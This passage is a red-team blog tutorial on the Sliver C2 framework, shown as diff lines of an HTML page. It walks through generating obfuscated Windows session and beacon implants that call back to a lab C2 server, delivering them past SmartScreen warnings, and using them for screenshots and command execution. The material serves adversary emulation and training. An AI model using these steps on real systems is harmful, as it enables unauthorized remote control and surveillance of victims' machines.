+</code></pre><p>On the C2 server, you can also verify that port 8888 is now open:</p>
+<pre tabindex="0"><code>┌──(root㉿kali)-[~/github/sliver]
+└─# netstat -antop | grep 8888 
+tcp6   0   0 :::8888      :::*      LISTEN   3434/sliver-server   off (0.00/0/0)
+</code></pre><h3 id="delivering-and-executing-the-implant">Delivering and executing the implant</h3>
+<p>Over at the Windows target, open the browser and download the implant file.
+Edge will warn you that this is not a common file. You have to click the three dots,
+then &ldquo;Keep&rdquo; to confirm the download, then confirm a second Defender SmartScreen warning
+with &ldquo;Keep anyway&rdquo;. Then click &ldquo;Open file&rdquo; (or navigate to the file in Explorer and double-click).
+This brings up another SmartScreen warning. Again, confirm with &ldquo;Run anyway&rdquo;:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/25_sliver_c2_beacons_and_sessions/download_execute_session.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Downloading and executing the implant</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Finally, your implant should be running (quite a ride).
+On the C2 server in Sliver, you should see a line like this,
+which indicates that a session from the implant was established:</p>
+<pre tabindex="0"><code>[*] Session 971c5a23 MEDICAL_CHANGE - 192.168.122.160:50051 (DESKTOP-IPQVF9T) - windows/amd64 - Fri, 01 Jul 2022 22:36:48 CEST
+</code></pre><p>You can also run the <code>sessions</code> command to see a list of sessions:</p>
+<pre tabindex="0"><code>sliver &gt; sessions
+
+ ID         Transport   Remote Address          Hostname          Username   Operating System   Health  
+========== =========== ======================= ================= ========== ================== =========
+ 971c5a23   mtls        192.168.122.160:50051   DESKTOP-IPQVF9T   tester     windows/amd64      [ALIVE]
+</code></pre><h3 id="using-a-session">Using a session</h3>
+<p>You can use your session with the <code>use</code> command.
+Just type it, hit enter, and an interactive prompt will appear
+that allows to select a session.
+Hit enter again and your prompt changes to the implant name,
+which was <code>MEDICAL_CHANGE</code> in my case. The session is now active
+and ready to accept your commands. With <code>info</code>, you can get more
+information about the implant:</p>
+<pre tabindex="0"><code>sliver &gt; use
+
+? Select a session or beacon: SESSION  971c5a23  MEDICAL_CHANGE  192.168.122.160:50051  DESKTOP-IPQVF9T  DESKTOP-IPQVF9T\tester  windows/amd64
+[*] Active session MEDICAL_CHANGE (971c5a23-73e0-4418-b9c2-266484546e0d)
+
+sliver (MEDICAL_CHANGE) &gt; info
+
+        Session ID: 971c5a23-73e0-4418-b9c2-266484546e0d
+              Name: MEDICAL_CHANGE
+          Hostname: DESKTOP-IPQVF9T
+              UUID: d512a12c-6b6d-4f19-814e-1f60088e9563
+          Username: DESKTOP-IPQVF9T\tester
+               UID: S-1-5-21-2966923018-1740081829-2498838087-1001
+               GID: S-1-5-21-2966923018-1740081829-2498838087-513
+               PID: 7244
+                OS: windows
+           Version: 10 build 19044 x86_64
+              Arch: amd64
+         Active C2: mtls://192.168.122.111:8888
+    Remote Address: 192.168.122.160:50051
+         Proxy URL: 
+Reconnect Interval: 1m0s
+</code></pre><p>Sliver implants supports several commands. You can get a full list with <code>help</code>.
+Features include file system exploration, file up- and downloads, port forwarding,
+taking screenshots and much more.</p>
+<p>For example, run <code>screenshot</code> and you get a screenshot of the Windows desktop written
+to your C2 server:</p>
+<pre tabindex="0"><code>sliver (MEDICAL_CHANGE) &gt; screenshot
+
+[*] Screenshot written to /tmp/screenshot_DESKTOP-IPQVF9T_20220701224728_3343901839.png (893.2 KiB)
+</code></pre><p>You can then view the screenshot on the C2 server:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/25_sliver_c2_beacons_and_sessions/screenshot.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Viewing the screenshot taken from the remote Windows target</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>When you are done with the session, run <code>background</code>.
+The session will of course remain active.</p>
+<p>To actually terminate the session, run <code>session -k</code>, followed by the session id.
+For example, it works like this:</p>
+<pre tabindex="0"><code>sliver &gt; sessions
+
+ ID         Transport   Remote Address          Hostname          Username   Operating System   Health  
+========== =========== ======================= ================= ========== ================== =========
+ 971c5a23   mtls        192.168.122.160:50051   DESKTOP-IPQVF9T   tester     windows/amd64      [ALIVE] 
+
+sliver &gt; sessions -k 971c5a23
+
+
+[!] Lost session 971c5a23 MEDICAL_CHANGE - 192.168.122.160:50051 (DESKTOP-IPQVF9T) - windows/amd64 - Fri, 01 Jul 2022 22:52:53 CEST
+</code></pre><p>In this example, killing the session terminated the <code>MEDICAL_CHANGE.exe</code> process
+on the Window target.</p>
+<h2 id="beacons">Beacons</h2>
+<h3 id="generating-the-implant-1">Generating the implant</h3>
+<p>Generating a beacon implant is very similar to session implant generation.
+You use the <code>generate beacon</code> command.
+Learn all about the flags with <code>help generate beacon</code>. Aside from all the flags discussed above,
+relevant beacon flags are:</p>
+<ul>
+<li><code>--seconds 5</code>: specify that the beacon should contact the C2 server every 5 seconds.
+You could alternatively use <code>--minutes</code>, <code>--hours</code> or <code>--days</code>.</li>
+<li><code>--jitter 3</code>: specify that an additional random delay of up to 3 seconds should be added to the 5 seconds interval.</li>
+</ul>
+<p>This is how I generated the beacon:</p>
+<pre tabindex="0"><code>sliver &gt; generate beacon --mtls 192.168.122.111 --os windows --arch amd64 --format exe --save /var/www/html --seconds 5 --jitter 3
+
+[*] Generating new windows/amd64 beacon implant binary (5s)
+[*] Symbol obfuscation is enabled
+[*] Build completed in 00:00:18
+[*] Implant saved to /var/www/html/STALE_PNEUMONIA.exe
+</code></pre><p>Don&rsquo;t forget <code>sudo chown www-data:www-data /var/www/html/STALE_PNEUMONIA.exe</code> to make the beacon file
+accessible for Apache.</p>
+<h3 id="delivering-and-executing-the-implant-1">Delivering and executing the implant</h3>
+<p>This step is the same as for the session implant.
+Just download and execute the file.
+Afterwards, you should see a process <code>STALE_PNEUMONIA.exe</code> running:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/25_sliver_c2_beacons_and_sessions/download_execute_beacon.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Beacon implant was downloaded, executed and is now running</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Sliver confirms the beacon connection with a line like this:</p>
+<pre tabindex="0"><code>[*] Beacon c9b67cda STALE_PNEUMONIA - 192.168.122.160:50080 (DESKTOP-IPQVF9T) - windows/amd64 - Fri, 01 Jul 2022 23:08:31 CEST
+</code></pre><p>Run the <code>beacons</code> command to get a list of active beacons:</p>
+<pre tabindex="0"><code>sliver &gt; beacons
+
+ ID         Name              Transport   Username   Operating System   Last Check-In   Next Check-In 
+========== ================= =========== ========== ================== =============== ===============
+ c9b67cda   STALE_PNEUMONIA   mtls        tester     windows/amd64      1s ago          5s
+</code></pre><h3 id="using-a-beacon">Using a beacon</h3>
+<p>Like for the session, run command <code>use</code>, select the beacon you want to interact with and hit enter.
+The prompt changes to the beacon&rsquo;s name and you can run <code>info</code> for more information:</p>
+<pre tabindex="0"><code>sliver &gt; use
+
+? Select a session or beacon: BEACON  c9b67cda  STALE_PNEUMONIA  192.168.122.160:50080  DESKTOP-IPQVF9T  DESKTOP-IPQVF9T\tester  windows/amd64
+[*] Active beacon STALE_PNEUMONIA (c9b67cda-75eb-4c30-8920-d743533266fc)
+
+sliver (STALE_PNEUMONIA) &gt; info
+
+         Beacon ID: c9b67cda-75eb-4c30-8920-d743533266fc
+              Name: STALE_PNEUMONIA
+          Hostname: DESKTOP-IPQVF9T
+              UUID: d512a12c-6b6d-4f19-814e-1f60088e9563
+          Username: DESKTOP-IPQVF9T\tester
+               UID: S-1-5-21-2966923018-1740081829-2498838087-1001
+               GID: S-1-5-21-2966923018-1740081829-2498838087-513
+               PID: 1748
+                OS: windows
+           Version: 10 build 19044 x86_64
+              Arch: amd64
+         Active C2: mtls://192.168.122.111:8888
+    Remote Address: 192.168.122.160:50080
+         Proxy URL: 
+          Interval: 5s
+            Jitter: 3s
+</code></pre><p>Use the <code>help</code> command to see a list of all available commands.
+In the example below, I&rsquo;ve used <code>execute notepad</code> to open notepad,
+then <code>screenshot</code> to see if it worked. Indeed, you can see that
+notepad was opened:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/25_sliver_c2_beacons_and_sessions/execute_notepad.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Executed notepad and took a screenshot of the result</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Note how each command is turned into a task. Since the beacon connection does not exist
+permanently, you have to wait for the next check-in until your commands execute.
+To see a list of all tasks and their status, use the <code>tasks</code> command.
+This example shows that both commands have completed successfully:</p>
+<pre tabindex="0"><code>sliver (STALE_PNEUMONIA) &gt; tasks
+
+ ID         State       Message Type   Created                          Sent                             Completed                      
+========== =========== ============== ================================ ================================ ================================
+ 93764fdb   completed   Screenshot     Fri, 01 Jul 2022 23:15:23 CEST   Fri, 01 Jul 2022 23:15:28 CEST   Fri, 01 Jul 2022 23:15:28 CEST 
+ 35d81817   completed   Execute        Fri, 01 Jul 2022 23:14:35 CEST   Fri, 01 Jul 2022 23:14:36 CEST   Fri, 01 Jul 2022 23:14:36 CEST
+</code></pre><p>You can now background and kill the beacon just like a session.</p>
+<h2 id="from-beacons-to-sessions">From beacons to sessions</h2>
+<p>When you run an implant in beacon mode you are not stuck with that.
+It&rsquo;s possible to switch from beacon to session mode.
+Use the <code>interactive</code> command to do that.
+To illustrate, assume you just received a beacon, as shown below:</p>
+<pre tabindex="0"><code>[*] Beacon 50010ca8 mtlsbeacon - 192.168.122.160:50422 (DESKTOP-IPQVF9T) - windows/amd64 - Fri, 01 Jul 2022 23:24:17 CEST
+
+sliver &gt; beacons
+
+ ID         Name         Transport   Username   Operating System   Last Check-In   Next Check-In 
+========== ============ =========== ========== ================== =============== ===============
+ 50010ca8   mtlsbeacon   mtls        tester     windows/amd64      4s ago          1m11s         
+
+sliver &gt; sessions
+
+[*] No sessions 🙁
+</code></pre><p>You don&rsquo;t have a session, but you would like to have one.
+All you have to do is use the beacon and type <code>interactive</code>.
+This queues up a new task that will attempt to establish a session.
+Now wait for the next check-in and a new session should appear:</p>
+<pre tabindex="0"><code>sliver &gt; use 50010ca8-d96d-4cff-81da-756c1e680fc2
+
+[*] Active beacon mtlsbeacon (50010ca8-d96d-4cff-81da-756c1e680fc2)
+
+sliver (mtlsbeacon) &gt; interactive
+
+[*] Using beacon&#39;s active C2 endpoint: mtls://192.168.122.111:8888
+[*] Tasked beacon mtlsbeacon (a050cc2a)
+
+[*] Session ab1ecb8a mtlsbeacon - 192.168.122.160:50425 (DESKTOP-IPQVF9T) - windows/amd64 - Fri, 01 Jul 2022 23:25:32 CEST
+
+sliver (mtlsbeacon) &gt; sessions
+
+ ID         Transport   Remote Address          Hostname          Username   Operating System   Health  
+========== =========== ======================= ================= ========== ================== =========
+ ab1ecb8a   mtls        192.168.122.160:50425   DESKTOP-IPQVF9T   tester     windows/amd64      [ALIVE]
+</code></pre><p>By default, the session will be created with the same C2 protocol used by the beacon.
+However, you could also specify another one, provided that support for it was compiled into the implant
+(yes, you can specify more than one C2 protocol at a time, more on that in later posts).
+Type <code>interactive --help</code> for all the options.</p>
+<h2 id="profiles">Profiles</h2>
+<p>Implant generation can be tedious since you have to type out so many options.
+To make it easier, define reusable profiles with common implant configuration.
+I&rsquo;ll demonstrate it for session and beacon implants below.</p>
+<p>Create a session implant profile with <code>profiles new</code>.
+For example, this profile corresponds to the session implant generated above:</p>
+<pre tabindex="0"><code>sliver (STALE_PNEUMONIA) &gt; profiles new --mtls 192.168.122.111 --os windows --arch amd64 --format exe session_win_default
+
+[*] Saved new implant profile session_win_default
+</code></pre><p>With <code>profiles generate</code> you can generate a new session implant from that profile.
+For example, it works like this:</p>
+<pre tabindex="0"><code>sliver (STALE_PNEUMONIA) &gt; profiles generate --save /var/www/html/ session_win_default
+
+[*] Generating new windows/amd64 implant binary
+[*] Symbol obfuscation is enabled
+[*] Build completed in 00:00:18
+[*] Implant saved to /var/www/html/CAUTIOUS_UNITY.exe
+</code></pre><p>With <code>profiles new beacon</code>, you can also create a beacon profile:</p>
+<pre tabindex="0"><code>sliver &gt; profiles new beacon --mtls 192.168.122.111 --os windows --arch amd64 --format exe  --seconds 5 --jitter 3 beacon_win_default
+
+[*] Saved new implant profile (beacon) beacon_win_default
+</code></pre><p>Generate the beacon implant:</p>
+<pre tabindex="0"><code>sliver &gt; profiles generate --save /var/www/html/ beacon_win_default
+
+[*] Generating new windows/amd64 beacon implant binary (5s)
+[*] Symbol obfuscation is enabled
+[*] Build completed in 00:00:18
+[*] Implant saved to /var/www/html/WELSH_SECURE.exe
+</code></pre><p>To see an overview of all the implants you generated, use the <code>implants</code> command:</p>
+<pre tabindex="0"><code>sliver &gt; implants
+
+ Name              Implant Type   OS/Arch             Format   Command &amp; Control                 Debug 
+================= ============== =============== ============ ================================= =======
+ CAUTIOUS_UNITY    session        windows/amd64   EXECUTABLE   [1] mtls://192.168.122.111:8888   false 
+ MEDICAL_CHANGE    session        windows/amd64   EXECUTABLE   [1] mtls://192.168.122.111:8888   false 
+ STALE_PNEUMONIA   beacon         windows/amd64   EXECUTABLE   [1] mtls://192.168.122.111:8888   false 
+ WELSH_SECURE      beacon         windows/amd64   EXECUTABLE   [1] mtls://192.168.122.111:8888   false 
+</code></pre>
+    </div>
+    
+    <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">Dominic Breuker</span>
+    
+  
+  <time itemprop="datePublished" datetime="2022-08-17T00:00:00&#43;00:00">
+    17 Aug, 2022
+  </time>
+  
+    in <span itemprop="articleSection"><a href="/categories/c2/">c2</a> and <a href="/categories/sliver/">sliver</a></span>
+  
+  
+    and tagged <a href="/tags/adversary-emulation/">adversary-emulation</a>, <a href="/tags/c2/">c2</a>, <a href="/tags/red-team/">red-team</a> and <a href="/tags/sliver/">sliver</a>
+  
+  using <span itemprop="wordCount">2637</span> words.
+</p>
+
+      
+
+
+  <aside>
+    <header>Related Content</header>
+    <ul>
+      
+        <li><a href="/post/learning_sliver_c2_01_installation/">Learning Sliver C2 (01) - Installation</a>
+        <time datetime="8M">8 minutes</time>
+      
+    </ul>
+  </aside>
+
+
+    </footer>
+  </article>
+</main>
+    <footer>
+  
+
+</footer>
+  </body>
+</html>
